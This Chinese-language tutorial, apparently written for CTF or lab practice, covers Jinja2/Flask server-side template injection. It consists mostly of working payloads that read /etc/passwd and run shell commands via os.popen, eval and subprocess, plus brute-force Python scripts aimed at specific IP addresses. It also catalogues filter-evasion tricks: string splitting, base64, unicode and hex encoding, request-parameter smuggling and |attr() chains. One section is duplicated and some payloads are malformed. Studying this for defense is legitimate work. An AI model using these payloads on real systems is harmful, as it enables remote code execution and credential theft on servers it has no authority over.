&#39;&#39;.__class__.__mro__: 获取 str 类型的方法解析顺序（Method Resolution Order，MRO），这是一个元组，包含了当前类和它的父类的顺序。
&#39;&#39;.__class__.__mro__[-1]: 获取方法解析顺序中的最后一个类，即 object 类。
&#39;&#39;.__class__.__mro__[-1].__subclasses__(): 获取 object 类的所有子类，这是一个列表。
enumerate(...): 对获取到的子类列表进行枚举，返回索引和对应的元素组成的元组。
for i in ...: print i: 遍历枚举后的元组列表，并打印每个元组。

综上所述，这段代码的作用是遍历 object 类的所有直接子类，并输出它们的索引和对应的子类
此file类可以直接用来读取文件：
&#123;&#123;[].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;

Python 3使用file类读取文件的方法仅限于Python 2环境，在Python 3环境中file类已经没有了。我们可以用&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; 这个类去读取文件。
首先编写脚本遍历目标Python环境中 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; 这个类索引号：
import requestsheaders = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#x27;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;]&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#x27;FileLoader&#x27; in res.text:        print(i)# 得到编号为79

所以payload如下：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[79][&quot;get_data&quot;](0, &quot;/etc/passwd&quot;)&#125;&#125;


&#123;&#123; ... &#125;&#125;: 双大括号通常用于表示模板语法，它们可能用于在某些 Web 框架中进行模板渲染，比如在前端的 Vue.js 或 AngularJS 中，或者在后端的像 Flask、Django 等 Web 框架中。
().__class__: 这是 Python 中创建一个空的元组，并访问该元组的类。元组的类是 &lt;class &#39;tuple&#39;&gt;。
().__class__.__bases__: 这是访问 &lt;class &#39;tuple&#39;&gt; 类的基类，它的基类是 &lt;class &#39;object&#39;&gt;。
().__class__.__bases__[0]: 这是获取 &lt;class &#39;tuple&#39;&gt; 类的基类中的第一个元素，即 &lt;class &#39;object&#39;&gt;。
().__class__.__bases__[0].__subclasses__(): 这是获取 Python 中 &lt;class &#39;object&#39;&gt; 类的所有子类。这个调用会返回一个包含所有子类的列表。
[&quot;get_data&quot;]: 这是对子类对象的属性进行访问，可能是希望访问第 79 个子类对象中名为 get_data 的方法。
(0, &quot;/etc/passwd&quot;): 这是作为参数传递给 get_data 方法的值，可能是为了触发某种行为。

利用 SSTI 执行命令寻找内建函数 eval 执行命令遍历目标Python环境中含有内建函数 eval 的子类的索引号：
import requestsif __name__ == &quot;__main__&quot;:    post_url = &quot;http://124.70.99.199:10086/level/1&quot;    for i in range(200):        param = &#123;            &#x27;code&#x27;: &quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&quot;        &#125;        res = requests.post(post_url, data=param)        if &#x27;eval&#x27; in res.text:            print(i,&quot;!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;)        else:            print(i,res.text,res.status_code,&quot;no&quot;)

所以随便挑一个构造payload为：&#123;&#123;''.__class__.__bases__[0].__subclasses__()[158].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')&#125;&#125;

__import__(&quot;os&quot;)：这是 Python 中的一种导入模块的方法。os 是 Python 标准库中用于与操作系统交互的模块，它包含了许多与文件和目录处理、进程管理等相关的函数和方法。
.popen(&quot;ls /&quot;)：popen() 是 os 模块中的一个函数，用于执行系统命令并返回命令的输出。在这里，&quot;ls /&quot; 是一个系统命令，用于列出根目录 / 下的文件和目录列表。
.read()：read() 是 popen() 返回的文件对象的方法，用于读取文件内容。

寻找 os 模块执行命令自己在靶场里面尝试失败
首先编写脚本遍历目标Python环境中含有os模块的类的索引号：
import requestsif __name__ == &#x27;__main__&#x27;:    post_url = &#x27;http://124.70.99.199:10086/level/1&#x27;    for i in range(200):        data = &#123;            &#x27;code&#x27;: &quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125;&#125;&quot;        &#125;        res = requests.post(post_url, data=data)        if &#x27;os.py&#x27; in res.text:            print(i, &#x27;!!!!!!&#x27;)        else:            print(i, res.text, res.status_code,&quot;NO&quot;)

挑一个构造payload：&#123;&#123;''.__class__.__bases__[0].__subclasses__()[154].__init__.__globals__['os'].popen('ls /').read()&#125;&#125;
寻找 popen 函数执行命令首先编写脚本遍历目标Python环境中含有 popen 函数的类的索引号：
import requestsif __name__ == &quot;__main__&quot;:    post_url = &#x27;http://124.70.99.199:10086/level/1&#x27;    for i in range(200):        data = &#123;            &#x27;code&#x27;: &quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125;&#125;&quot;        &#125;        res = requests.post(post_url, data=data)        if &#x27;popen&#x27; in res.text:            print(i, &quot;!!!!!!!!!!!!!!!!!!!!&quot;)        else:            print(i, res.text, res.status_code, &quot;NO&quot;)

挑一个构造payload：&#123;&#123;().__class__.__bases__[0].__subclasses__()[154].__init__.__globals__['popen']("ls /").read()&#125;&#125;
寻找 importlib 类执行命令Python 中存在 &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt; 类，目的就是提供 Python 中 import 语句的实现（以及 __import__ 函数）。那么可以直接利用该类中的load_module将os模块导入，从而使用 os 模块执行命令。
首先编写脚本遍历目标Python环境中 importlib 类的索引号：
import requestsif __name__ == &quot;__main__&quot;:    post_url = &#x27;http://124.70.99.199:10086/level/1&#x27;    for i in range(200):        data = &#123;            &#x27;code&#x27;: &quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;]&#125;&#125;&quot;        &#125;        res = requests.post(post_url, data=data)        if &#x27;_frozen_importlib.BuiltinImporter&#x27; in res.text:            print(i, &quot;!!!!!!!!!!!!!!!!!!!!&quot;)        else:            print(i, res.text, res.status_code, &quot;NO&quot;)

构造payload：&#123;&#123;[].__class__.__base__.__subclasses__()[120]["load_module"]("os")["popen"]("ls /").read()&#125;&#125;
寻找 linecache 函数执行命令linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块，所以可以利用这个 linecache 函数去执行命令。
首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号：
import requestsif __name__ == &#x27;__main__&#x27;:    post_url = &#x27;http://124.70.99.199:10086/level/1&#x27;    for i in range(300):        data = &#123;            &#x27;code&#x27;:&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125;&#125;&quot;        &#125;        res = requests.post(post_url, data = data)        if &#x27;linecache&#x27; in res.text:            print(i, &quot;!!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;)        else:            print(i, res.text, res.status_code, &quot;NO&quot;)

构造payload：&#123;&#123;[].__class__.__base__.__subclasses__()[284].__init__.__globals__['linecache']['os'].popen('ls /').read()&#125;&#125;
寻找 subprocess.Popen 类执行命令从python2.4版本开始，可以用 subprocess 这个模块来产生子进程，并连接到子进程的标准输入&#x2F;输出&#x2F;错误中去，还可以得到子进程的返回值。
subprocess 意在替代其他几个老的模块或者函数，比如：os.system、os.popen 等函数。
首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号：
import requestsif __name__ == &#x27;__main__&#x27;:    post_url = &#x27;http://124.70.99.199:10086/level/1&#x27;    for i in range(500,550):        data = &#123;            &#x27;code&#x27;:&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;]&#125;&#125;&quot;        &#125;        res = requests.post(post_url, data = data)        if &#x27;subprocess.Popen&#x27; in res.text:            print(i, &quot;!!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;)        else:            print(i, res.text, res.status_code, &quot;NO&quot;)

构造payload：&#123;&#123;[].__class__.__base__.__subclasses__()[520]('ls /',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;
关键字绕过利用字符串拼接绕过我们可以利用“**+**”进行字符串拼接，绕过关键字过滤，例如：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&#x27;/fl&#x27;+&#x27;ag&#x27;).read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;o&quot;+&quot;s&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__buil&#x27;+&#x27;tins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

只要返回的是字典类型的或是字符串格式的，即payload中引号内的，在调用的时候都可以使用字符串拼接绕过。
利用编码绕过我们可以利用对关键字编码的方法，绕过关键字过滤，例如用base64编码绕过：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;X19idWlsdGluc19f&#x27;.decode(&#x27;base64&#x27;)][&#x27;ZXZhbA==&#x27;.decode(&#x27;base64&#x27;)](&#x27;X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==&#x27;.decode(&#x27;base64&#x27;))&#125;&#125;

等同于：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

可以看到，在payload中，只要是字符串的，即payload中引号内的，都可以用编码绕过。同理还可以进行rot13、16进制编码等。
利用Unicode编码绕过关键字（flask适用）我们可以利用unicode编码的方法，绕过关键字过滤，例如：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#x27;][&#x27;\u0065\u0076\u0061\u006c&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;\u006f\u0073&#x27;].popen(&#x27;\u006c\u0073\u0020\u002f&#x27;).read()&#125;&#125;

等同于：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;

利用Hex编码绕过关键字和上面那个一样，只不过将Unicode编码换成了Hex编码，适用于过滤了“u”的情况。
我们可以利用hex编码的方法，绕过关键字过滤，例如：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;][&#x27;\x65\x76\x61\x6c&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;\x6f\x73&#x27;].popen(&#x27;\x6c\x73\x20\x2f&#x27;).read()&#125;&#125;

等同于：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;

利用引号绕过我们可以利用引号来绕过对关键字的过滤。例如，过滤了flag，那么我们可以用 fl&quot;&quot;ag 或 fl&#39;&#39;ag 的形式来绕过：
[].__class__.__base__.__subclasses__()[40](&quot;/fl&quot;&quot;ag&quot;).read()

再如：
().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;o&#x27;&#x27;s&#x27;].popen(&#x27;ls&#x27;).read()&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__buil&#x27;&#x27;tins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

可以看到，在payload中，只要是字符串的，即payload中引号内的，都可以用引号绕过。
利用join()函数绕过我们可以利用join()函数来绕过关键字过滤。例如，题目过滤了flag，那么我们可以用如下方法绕过：
[].__class__.__base__.__subclasses__()[40](&quot;fla&quot;.join(&quot;/g&quot;)).read()

绕过其他字符过滤了中括号[ ]利用 __getitem__() 绕过
可以使用 __getitem__() 方法输出序列属性中的某个索引处的元素，如：
&quot;&quot;.__class__.__mro__[2]&quot;&quot;.__class__.__mro__.__getitem__(2)[&#x27;__builtins__&#x27;].__getitem__(&#x27;eval&#x27;)

如下示例：
&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(40)(&#x27;/etc/passwd&#x27;).read()&#125;&#125;       // 指定序列属性&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;eval&#x27;)(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;       // 指定字典属性

利用 pop() 绕过
pop()方法可以返回指定序列属性中的某个索引处的元素或指定字典属性中某个键对应的值，如下示例：
&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()&#125;&#125;       // 指定序列属性&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.pop(&#x27;__builtins__&#x27;).pop(&#x27;eval&#x27;)(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;       // 指定字典属性

注意：最好不要用pop()，因为pop()会删除相应位置的值。（除非你有相应的权限才可以）
利用字典读取绕过
我们知道访问字典里的值有两种方法，一种是把相应的键放入熟悉的方括号 [] 里来访问，一种就是用点 . 来访问。所以，当方括号 [] 被过滤之后，我们还可以用点 . 的方式来访问，如下示例
// __builtins__.eval()&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.__builtins__.eval(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

等同于：
// [__builtins__][&#x27;eval&#x27;]()&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

过滤了引号利用chr()绕过
先获取chr()函数，赋值给chr，后面再拼接成一个字符串
&#123;% set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()&#125;&#125;# &#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()&#125;&#125;

等同于
&#123;&#123;().__class__.__bases__[0].__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()&#125;&#125;

利用request对象绕过
示例：
&#123;&#123;().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path=/etc/passwd（只能get）&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.values.cmd).read()&#125;&#125;&amp;os=os&amp;cmd=ls /（get/post都可以）

等同于：
&#123;&#123;().__class__.__bases__[0].__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()&#125;&#125;&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;

如果过滤了args，可以将其中的request.args改为request.values，POST和GET两种方法传递的数据request.values都可以接收
过滤了下划线__利用request对象绕过
&#123;&#123;()[request.args.class][request.args.bases][0][request.args.subclasses]()[40](&#x27;/flag&#x27;).read()&#125;&#125;&amp;class=__class__&amp;bases=__bases__&amp;subclasses=__subclasses__&#123;&#123;()[request.args.class][request.args.bases][0][request.args.subclasses]()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;&amp;class=__class__&amp;bases=__bases__&amp;subclasses=__subclasses__

等同于：
&#123;&#123;().__class__.__bases__[0].__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()&#125;&#125;&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;

还有一种编码绕过
__class__ =&gt; \x5f\x5fclass\x5f\x5f

其中_的十六进制编码为\x5f，于是我们可以构造出如下的payload：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[154].__init__.__globals__[&#x27;popen&#x27;](&quot;ls /&quot;).read()&#125;&#125;

&#123;&#123;()|attr(&quot;\x5f\x5fclass\x5f\x5f&quot;)|attr(&quot;\x5f\x5fbase\x5f\x5f&quot;)|attr(&quot;\x5f\x5fsubclasses\x5f\x5f&quot;)()|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(154)|attr(&quot;\x5f\x5finit\x5f\x5f&quot;)|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&#x27;popen&#x27;)(&quot;ls /&quot;)|attr(&quot;read&quot;)()&#125;&#125;

过滤了点 .利用 |attr() 绕过（适用于flask）
如果 . 也被过滤，且目标是JinJa2（flask）的话，可以使用原生JinJa2函数attr()，即：
().__class__   =&gt;  ()|attr(&quot;__class__&quot;)

示例：
&#123;&#123;()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(77)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls /&quot;)|attr(&quot;read&quot;)()&#125;&#125;

等同于：
&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;

利用中括号[ ]绕过
如下示例：
&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__bases__&#x27;][0][&#x27;__subclasses__&#x27;]()[59][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)&#125;&#125;

等同于：
&#123;&#123;().__class__.__bases__.[0].__subclasses__().[59].__init__[&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;].eval(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

这样的话，那么 __class__、__bases__ 等关键字就成了字符串，就都可以用前面所讲的关键字绕过的姿势进行绕过了。
&#123;&#123;().__class__.__bases__[0].__subclasses__()[158].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;&#123;&#123;()[&#x27;__class__&#x27;][&#x27;__bases__&#x27;][0][&#x27;__subclasses__&#x27;][158][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;)[popen(&quot;ls /&quot;)][read()]&#x27;)&#125;&#125;

过滤了大括号可以使用 &#123;% if ... %&#125;1&#123;% endif %&#125; 配合 os.popen 和 curl 将执行结果外带（不外带的话无回显）出来：
&#123;% if &#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;ls /&#x27;) %&#125;1&#123;% endif %&#125;

也可以用 &#123;%print(......)%&#125; 的形式来代替大括号，如下：
&#123;%print(&#x27;&#x27;.__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read())%&#125;

利用 |attr() 来Bypass这里说一个新东西，就是原生JinJa2函数 attr()，这是一个 attr() 过滤器，它只查找属性，获取并返回对象的属性的值，过滤器与变量用管道符号（ | ）分割。如：
foo|attr(&quot;bar&quot;)   等同于   foo[&quot;bar&quot;]

|attr() 配合其他姿势可同时绕过双下划线 __ 、引号、点 . 和 [ 等，下面给出示例。
同时过滤了 . 和 []过滤了以下字符：.    [
绕过姿势：
&#123;&#123;()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(77)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls&quot;)|attr(&quot;read&quot;)()&#125;&#125;

等同于：
&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;

同时过滤了 __ 、点. 和 []过滤了以下字符：
__    .    [    &quot;

下面我们演示绕过姿势，先写出payload的原型：
&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

由于中括号 [ 被过滤了，我们可以用 __getitem__() 来绕过（尽量不要用pop()），类似如下：
&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(77).__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;eval&#x27;)(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

由于还过滤了下划线 __，我们可以用request对象绕过，但是还过滤了中括号 []，所以我们要同时绕过 __ 和 [，就用到了我们的|attr()
所以最终的payload如下：
&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(77)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&#x27;ls /&#x27;).read()

同时过滤了 __ 、点. 和 []过滤了以下字符：
__    .    [    &quot;

下面我们演示绕过姿势，先写出payload的原型：
&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

由于中括号 [ 被过滤了，我们可以用 __getitem__() 来绕过（尽量不要用pop()），类似如下：
&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(77).__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;eval&#x27;)(&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

由于还过滤了下划线 __，我们可以用request对象绕过，但是还过滤了中括号 []，所以我们要同时绕过 __ 和 [，就用到了我们的|attr()
所以最终的payload如下：
&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(77)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&#x27;ls /&#x27;).read()

用Unicode编码配合 |attr() 进行Bypass过滤了以下字符：
&#x27;  request  &#123;&#123;  _  %20(空格)  [  ]  .  __globals__   __getitem__

我们用 &#123;%print(......)%&#125;绕过对 &#123;&#123;` 的过滤，并用unicode绕过对关键字的过滤。unicode绕过是一种网上没提出的方法。

假设我们要构造的payload原型为：

&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;

先用 `|attr` 绕过 `.` 和 `[]`：

&#123;&#123;()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(77)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls&quot;)|attr(&quot;read&quot;)()&#125;&#125;

我们可以将过滤掉的字符用unicode替换掉：

&#123;&#123;()|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;)()|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(77)|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls&quot;)|attr(&quot;read&quot;)()&#125;&#125;

### 用Hex编码配合 `|attr()` 进行Bypass

和上面那个一样，只不过是将Unicode编码换成了Hex编码，适用于“u”被过滤了的情况。

我们可以将过滤掉的字符用Hex编码替换掉：

&#123;&#123;()|attr(&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;)()|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(258)|attr(&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat\x20\x66\x6c\x61\x67\x2e\x74\x78\x74&quot;)|attr(&quot;read&quot;)()&#125;&#125;

## 使用 JinJa 的过滤器进行Bypass

在 Flask JinJa 中，内只有很多过滤器可以使用，前文的attr()就是其中的一个过滤器。变量可以通过过滤器进行修改，过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数，也可以没有参数，过滤器函数可以带括号也可以不带括号。可以使用管道符号（|）连接多个过滤器，一个过滤器的输出应用于下一个过滤器。

详情请看官方文档：https://jinja.palletsprojects.com/en/master/templates/#builtin-filters

以下是内置的所有的过滤器列表：

| [`abs()`](https://jinja.palletsprojects.com/en/master/templates/#abs) | [`float()`](https://jinja.palletsprojects.com/en/master/templates/#float) | [`lower()`](https://jinja.palletsprojects.com/en/master/templates/#lower) | [`round()`](https://jinja.palletsprojects.com/en/master/templates/#round) | [`tojson()`](https://jinja.palletsprojects.com/en/master/templates/#tojson) |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| [`attr()`](https://jinja.palletsprojects.com/en/master/templates/#attr) | [`forceescape()`](https://jinja.palletsprojects.com/en/master/templates/#forceescape) | [`map()`](https://jinja.palletsprojects.com/en/master/templates/#map) | [`safe()`](https://jinja.palletsprojects.com/en/master/templates/#safe) | [`trim()`](https://jinja.palletsprojects.com/en/master/templates/#trim) |
| [`batch()`](https://jinja.palletsprojects.com/en/master/templates/#batch) | [`format()`](https://jinja.palletsprojects.com/en/master/templates/#format) | [`max()`](https://jinja.palletsprojects.com/en/master/templates/#max) | [`select()`](https://jinja.palletsprojects.com/en/master/templates/#select) | [`truncate()`](https://jinja.palletsprojects.com/en/master/templates/#truncate) |
| [`capitalize()`](https://jinja.palletsprojects.com/en/master/templates/#capitalize) | [`groupby()`](https://jinja.palletsprojects.com/en/master/templates/#groupby) | [`min()`](https://jinja.palletsprojects.com/en/master/templates/#min) | [`selectattr()`](https://jinja.palletsprojects.com/en/master/templates/#selectattr) | [`unique()`](https://jinja.palletsprojects.com/en/master/templates/#unique) |
